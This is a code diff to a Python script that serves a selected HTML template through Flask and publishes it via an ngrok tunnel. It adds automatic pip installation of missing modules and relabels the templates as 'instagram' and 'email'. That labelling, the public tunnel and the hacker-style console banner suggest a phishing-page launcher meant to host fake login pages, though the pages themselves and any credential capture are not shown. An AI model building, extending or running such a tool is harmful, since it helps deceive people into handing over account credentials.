@@ -1,7 +1,24 @@
-from flask import Flask, send_from_directory
-from pyngrok import ngrok
 import os
+import sys
 import logging
+
+# -------- Auto-install modules if missing --------
+def install(package):
+    os.system(f"{sys.executable} -m pip install {package}")
+
+try:
+    from flask import Flask, send_from_directory
+except ModuleNotFoundError:
+    print("Installing Flask...")
+    install("flask")
+    from flask import Flask, send_from_directory
+
+try:
+    from pyngrok import ngrok
+except ModuleNotFoundError:
+    print("Installing pyngrok...")
+    install("pyngrok")
+    from pyngrok import ngrok
 
 # -------- Colors --------
 red = '\033[1;31m'
@@ -47,16 +64,17 @@ if __name__ == "__main__":
 ╔══════════════════════════════╗
 ║ {cyan}Choose Page Template{pink}        
 ╠══════════════════════════════╣
-║ [1] Page One                  
-║ [2] Page Two                  
+║ [1] instagram                  
+║ [2] email                 
 ╚══════════════════════════════╝
 {reset}""")
     choice = input(f"{ylo}Enter your choice (1/2): {reset}").strip()
     selected_html = "1.html" if choice == "1" else "2.html"
 
-    # Start Flask server
+    # Start Flask server and ngrok tunnel
     port = 8080
     public_url = ngrok.connect(port)
+
     print(f"""{grn}
 ╔═══════════════════════════════════╗
 ║ {cyan}SERVER RUNNING...               {grn}
